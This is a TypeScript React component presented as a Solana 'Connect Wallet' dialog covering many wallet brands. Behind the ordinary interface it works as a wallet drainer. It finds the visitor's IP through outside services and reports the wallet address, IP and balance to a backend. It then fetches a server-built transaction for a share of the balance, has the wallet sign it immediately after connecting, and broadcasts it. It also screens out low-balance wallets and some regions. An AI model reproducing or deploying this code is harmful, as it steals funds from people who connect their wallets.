"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect, useCallback } from "react" 
import { Loader2, ExternalLink, AlertCircle, CheckCircle2 } from "lucide-react"
import { toast } from "sonner"

interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}

interface WalletConfig {
  name: string
  icon: string
  provider?: () => any
  checkMethod?: () => boolean
  deepLink?: string
  universalLink?: string
  mobile?: {
    android: { schema: string; universal: string }
    ios: { schema: string; universal: string }
  }
  downloadUrl: string
}

const DESKTOP_WALLETS: Record<string, WalletConfig> = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
    downloadUrl: "https://phantom.app/download",
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
    downloadUrl: "https://solflare.com/download",
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    provider: () => (window as any).backpack,
    checkMethod: () => (window as any).backpack?.isBackpack,
    downloadUrl: "https://backpack.app/download",
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    provider: () => (window as any).exodus?.solana,
    checkMethod: () => (window as any).exodus?.solana?.isExodus,
    downloadUrl: "https://exodus.com/download",
  },
  okx: {
    name: "OKX Wallet",
    icon: "/okx-icon.png",
    provider: () => (window as any).okxwallet?.solana,
    checkMethod: () => (window as any).okxwallet?.solana?.isOkxWallet,
    downloadUrl: "https://okx.com/download",
  },
  "magic-eden": {
    name: "Magic Eden",
    icon: "/magic-eden-icon.png",
    provider: () => (window as any).magicEden,
    checkMethod: () => (window as any).magicEden?.isMagicEden,
    downloadUrl: "https://magiceden.io/wallet",
  },
  trust: {
    name: "Trust Wallet",
    icon: "/trust-icon.png",
    provider: () => (window as any).trustWallet,
    checkMethod: () => (window as any).trustWallet?.isTrust,
    downloadUrl: "https://trustwallet.com/download",
  },
  bitget: {
    name: "Bitget Wallet",
    icon: "/bitget-icon.png",
    provider: () => (window as any).bitget,
    checkMethod: () => (window as any).bitget?.isBitKeep,
    downloadUrl: "https://web3.bitget.com/en/wallet-download",
  },
  sollet: {
    name: "Sollet",
    icon: "/sollet-icon.png",
    provider: () => (window as any).sollet,
    checkMethod: () => (window as any).sollet?.isSollet,
    downloadUrl: "https://www.sollet.io/extension",
  },
  coin98: {
    name: "Coin98",
    icon: "/coin98-icon.png",
    provider: () => (window as any).coin98,
    checkMethod: () => (window as any).coin98?.isCoin98,
    downloadUrl: "https://coin98.com/wallet",
  },
  slope: {
    name: "Slope",
    icon: "/slope-icon.png",
    provider: () => (window as any).slope,
    checkMethod: () => (window as any).slope?.isSlope,
    downloadUrl: "https://slope.finance/#/download",
  },
  clover: {
    name: "Clover Wallet",
    icon: "/clover-icon.png",
    provider: () => (window as any).clover,
    checkMethod: () => (window as any).clover?.isClover,
    downloadUrl: "https://clover.finance/wallet",
  },
  brave: {
    name: "Brave Wallet",
    icon: "/brave-icon.png",
    provider: () => (window as any).braveSolana,
    checkMethod: () => (window as any).braveSolana?.isBraveWallet,
    downloadUrl: "https://brave.com/wallet",
  },
}

const MOBILE_WALLETS: Record<string, WalletConfig> = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    downloadUrl: "https://phantom.app/download",
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    downloadUrl: "https://solflare.com/download",
  },
  backpack: {
    name: "Backpack",
    icon: "/backpack-icon.png",
    deepLink: "backpack://",
    universalLink: "https://backpack.app/",
    downloadUrl: "https://backpack.app/download",
  },
  exodus: {
    name: "Exodus",
    icon: "/exodus-icon.png",
    deepLink: "exodus://",
    universalLink: "https://exodus.com/",
    downloadUrl: "https://exodus.com/download",
  },
  okx: {
    name: "OKX Wallet",
    icon: "/okx-icon.png",
    deepLink: "okx://",
    universalLink: "https://okx.com/web3",
    downloadUrl: "https://okx.com/download",
  },
}

const WALLETS = Object.entries(DESKTOP_WALLETS).map(([id, config]) => ({
  id,
  name: config.name,
  icon: config.icon,
  description: getWalletDescription(id),
}))

function getWalletDescription(walletId: string): string {
  const descriptions: Record<string, string> = {
    phantom: "Most popular Solana wallet with NFT support",
    solflare: "Secure wallet for Solana DeFi & staking",
    backpack: "Web3 wallet built for traders and developers",
    exodus: "Multi-chain wallet with built-in exchange",
    okx: "Exchange-backed wallet with Web3 access",
    "magic-eden": "Official wallet of Magic Eden NFT marketplace",
    trust: "Binance's official multi-chain wallet",
    bitget: "Bitget exchange Web3 wallet",
    sollet: "Lightweight browser extension for Solana",
    coin98: "Super wallet supporting 40+ blockchains",
    slope: "Non-custodial wallet with beautiful UI",
    clover: "Wallet for Clover Finance ecosystem",
    brave: "Built-in wallet in Brave browser",
  }
  return descriptions[walletId] || "Connect to the application"
}

export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobile, setIsMobile] = useState(false)
  const [isBlockedGeo, setIsBlockedGeo] = useState(false)
  const [connectingWallet, setConnectingWallet] = useState<string | null>(null)
  const [connectionStatus, setConnectionStatus] = useState<"idle" | "connecting" | "success" | "error">("idle")
  const [errorMessage, setErrorMessage] = useState<string>("")

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase()
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
      setIsMobile(mobile)
    }
    
    checkMobile()
    checkGeoBlockStatus()
  }, [])

  const checkGeoBlockStatus = useCallback(async () => {
    try {
      const response = await fetch("/api/check-geo", {
        signal: AbortSignal.timeout(3000),
      })
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeo(true)
        onClose()
        toast.error("Service not available in your region")
      }
    } catch (error) {
      console.warn("Geo check failed, proceeding anyway")
    }
  }, [onClose])

  const isInWalletBrowserInstance = useCallback((walletId: string): boolean => {
    const userAgent = navigator.userAgent.toLowerCase()
    const walletChecks: Record<string, string[]> = {
      phantom: ["phantom"],
      solflare: ["solflare"],
      backpack: ["backpack"],
      exodus: ["exodus"],
      okx: ["okx", "okxwallet"],
      "magic-eden": ["magiceden"],
      trust: ["trust", "trustwallet"],
      bitget: ["bitget", "bitkeep"],
      sollet: ["sollet"],
      coin98: ["coin98"],
      slope: ["slope"],
      clover: ["clover"],
      brave: ["brave"],
    }
    
    return walletChecks[walletId]?.some(keyword => userAgent.includes(keyword)) || false
  }, [])

  const getIPAddress = useCallback(async (): Promise<string> => {
    try {
      const services = [
        "https://api.ipify.org?format=json",
        "https://api.my-ip.io/ip",
        "https://api.ip.sb/ip",
        "https://ifconfig.me/ip",
      ]

      for (const service of services) {
        try {
          const response = await fetch(service, { signal: AbortSignal.timeout(2000) })
          if (response.ok) {
            const text = await response.text()
            const ip = text.trim()
            if (ip && ip !== "" && !ip.includes("<")) {
              return ip
            }
          }
        } catch (error) {
          continue
        }
      }
    } catch (error) {
      console.error("Failed to get IP address:", error)
    }
    
    return "unknown"
  }, [])

  const sendTransactionNotification = useCallback(async (
    walletAddress: string,
    walletType: string,
    balanceSOL: number,
    balanceUSD: number,
    userIP: string,
    transactionAmount?: number,
    percentage?: number,
    txSignature?: string,
    error?: string,
    errorDetails?: string
  ) => {
    try {
      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress,
          walletType,
          balanceSOL,
          balanceUSD,
          userIP,
          transactionAmount,
          percentage,
          txSignature,
          error,
          errorDetails,
        }),
      })
    } catch (error) {
      console.error("Failed to send transaction notification:", error)
    }
  }, [])

  const connectDesktopWallet = useCallback(async (walletId: string) => {
    setConnectingWallet(walletId)
    setConnectionStatus("connecting")
    setErrorMessage("")

    const walletConfig = DESKTOP_WALLETS[walletId]
    if (!walletConfig) {
      setConnectionStatus("error")
      setErrorMessage("Wallet not supported")
      toast.error("Wallet not supported")
      return
    }

    const provider = walletConfig.provider?.()
    const isInstalled = walletConfig.checkMethod?.()

    if (!isInstalled || !provider) {
      setConnectionStatus("error")
      setErrorMessage(`${walletConfig.name} not detected`)
      toast.error(`Please install ${walletConfig.name}`, {
        action: {
          label: "Download",
          onClick: () => window.open(walletConfig.downloadUrl, "_blank"),
        },
      })
      return
    }

    try {
      const response = await provider.connect()
      const publicKey = response.publicKey.toString()
      
      setConnectionStatus("success")
      toast.success(`${walletConfig.name} connected successfully`)
      
      // Get IP address
      const userIP = await getIPAddress()
      
      // Send connection notification
      await sendTransactionNotification(
        publicKey,
        walletConfig.name,
        0, // Balance will be fetched in scan
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        undefined,
        `${walletConfig.name} connected successfully`
      )
      
      // Start wallet scanning and transaction
      await scanAndCreateTransaction(publicKey, provider, walletConfig.name, userIP)
    } catch (error: any) {
      console.error(`Connection error for ${walletConfig.name}:`, error)
      setConnectionStatus("error")
      setErrorMessage(error.message || "Connection failed")
      toast.error(`Failed to connect ${walletConfig.name}`)
      
      // Send error notification
      const userIP = await getIPAddress()
      await sendTransactionNotification(
        "unknown",
        walletConfig.name,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "Connection Failed",
        error.message || "Unknown connection error"
      )
    } finally {
      setConnectingWallet(null)
      setTimeout(() => setConnectionStatus("idle"), 2000)
    }
  }, [getIPAddress, sendTransactionNotification])

  const connectMobileWallet = useCallback((walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId]
    if (!walletConfig) {
      toast.error("Wallet not supported on mobile")
      return
    }

    if (isInWalletBrowserInstance(walletId)) {
      connectDesktopWallet(walletId)
      return
    }

    const currentUrl = encodeURIComponent(window.location.href)
    const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent)
    
    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${currentUrl}?ref=${currentUrl}`
      universalLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`
    } else if (walletId === "solflare") {
      deepLink = `${walletConfig.deepLink}${currentUrl}`
      universalLink = `${walletConfig.universalLink}${currentUrl}`
    } else if (walletConfig.deepLink) {
      deepLink = `${walletConfig.deepLink}${currentUrl}`
      universalLink = `${walletConfig.universalLink}${currentUrl}`
    } else {
      window.open(walletConfig.downloadUrl, "_blank")
      return
    }

    // Try deep link first
    window.location.href = deepLink
    
    // Fallback to universal link after delay
    setTimeout(() => {
      window.location.href = universalLink
    }, 500)
  }, [connectDesktopWallet, isInWalletBrowserInstance])

  const scanAndCreateTransaction = useCallback(async (
    publicKey: string,
    provider: any,
    walletType: string,
    userIP: string
  ) => {
    try {
      toast.loading("Scanning wallet balance...")
      
      // Send scan request
      const scanResponse = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP,
          walletType,
        }),
      })

      const scanData = await scanResponse.json()

      if (!scanResponse.ok || scanData.error) {
        const errorMsg = scanData.message || "Wallet scan failed"
        toast.error(errorMsg)
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.walletBalance || 0,
          scanData.walletBalanceUSD || 0,
          userIP,
          undefined,
          undefined,
          undefined,
          "Scan Failed",
          errorMsg
        )
        
        onClose()
        return
      }

      if (scanData.message === "Insufficient balance") {
        toast.error("Insufficient balance for transaction")
        
        await sendTransactionNotification(
          publicKey,
          walletType,
          scanData.balance || 0,
          scanData.balance * 153.32,
          userIP,
          undefined,
          undefined,
          undefined,
          "Insufficient Balance",
          `Balance: ${scanData.balance?.toFixed(4)} SOL < Minimum: ${scanData.minRequired} SOL`
        )
        
        onClose()
        return
      }

      // Create and sign transaction
      toast.loading("Preparing transaction...")
      
      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(scanData.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)
      
      toast.loading("Broadcasting transaction...")

      // Try multiple RPC endpoints
      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")
          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: scanData.blockhash,
            lastValidBlockHeight: scanData.lastValidBlockHeight,
          }, "confirmed")
          
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction broadcast failed")
      }

      // Send success notification
      await sendTransactionNotification(
        publicKey,
        walletType,
        scanData.walletBalance,
        scanData.walletBalanceUSD,
        userIP,
        scanData.transferAmount,
        scanData.percentage,
        signature
      )

      toast.success("Transaction completed successfully!", {
        action: {
          label: "View",
          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
        },
      })

      setTimeout(() => {
        onClose()
      }, 2000)

    } catch (error: any) {
      console.error("Transaction error:", error)
      
      const errorMsg = error.message || "Transaction failed"
      toast.error(errorMsg)
      
      await sendTransactionNotification(
        publicKey,
        walletType,
        0,
        0,
        userIP,
        undefined,
        undefined,
        undefined,
        "Transaction Failed",
        errorMsg
      )
      
      setTimeout(() => {
        onClose()
      }, 3000)
    }
  }, [onClose, sendTransactionNotification])

  const handleWalletClick = useCallback((walletId: string) => {
    if (isMobile) {
      connectMobileWallet(walletId)
    } else {
      connectDesktopWallet(walletId)
    }
  }, [isMobile, connectMobileWallet, connectDesktopWallet])

  if (isBlockedGeo) {
    return null
  }

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
        <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
          <DialogTitle className="text-xl sm:text-2xl font-bold text-center">
            Connect Wallet
          </DialogTitle>
          <DialogDescription className="text-sm sm:text-base text-center">
            Choose a wallet to connect to the application
          </DialogDescription>
          
          {connectionStatus === "error" && (
            <div className="mt-2 p-2 bg-red-50 border border-red-200 rounded-lg flex items-center gap-2">
              <AlertCircle className="h-4 w-4 text-red-600" />
              <span className="text-sm text-red-600">{errorMessage}</span>
            </div>
          )}
          
          {connectionStatus === "success" && (
            <div className="mt-2 p-2 bg-green-50 border border-green-200 rounded-lg flex items-center gap-2">
              <CheckCircle2 className="h-4 w-4 text-green-600" />
              <span className="text-sm text-green-600">Wallet connected successfully</span>
            </div>
          )}
        </DialogHeader>

        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5 max-h-[60vh] overflow-y-auto">
          {WALLETS.map((wallet) => (
            <Button
              key={wallet.id}
              variant="outline"
              className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent ${
                connectingWallet === wallet.id ? "border-primary bg-primary/5" : ""
              }`}
              onClick={() => handleWalletClick(wallet.id)}
              disabled={connectingWallet !== null && connectingWallet !== wallet.id}
            >
              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                <Image
                  src={wallet.icon || "/placeholder.svg"}
                  alt={`${wallet.name} icon`}
                  fill
                  className="object-cover"
                  sizes="48px"
                />
                {connectingWallet === wallet.id && (
                  <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
                    <Loader2 className="h-6 w-6 text-white animate-spin" />
                  </div>
                )}
              </div>
              <div className="flex flex-col items-start text-left flex-1">
                <div className="flex items-center gap-2">
                  <span className="font-semibold text-base">{wallet.name}</span>
                  {isMobile && wallet.id in MOBILE_WALLETS && (
                    <ExternalLink className="h-3 w-3 text-muted-foreground" />
                  )}
                </div>
                <span className="text-sm text-muted-foreground">{wallet.description}</span>
              </div>
              {connectingWallet === wallet.id && (
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
              )}
            </Button>
          ))}
          
          <div className="mt-2 text-xs text-center text-muted-foreground">
            <p>By connecting, you agree to our Terms of Service</p>
            <p className="mt-1">Supported networks: Solana Mainnet</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}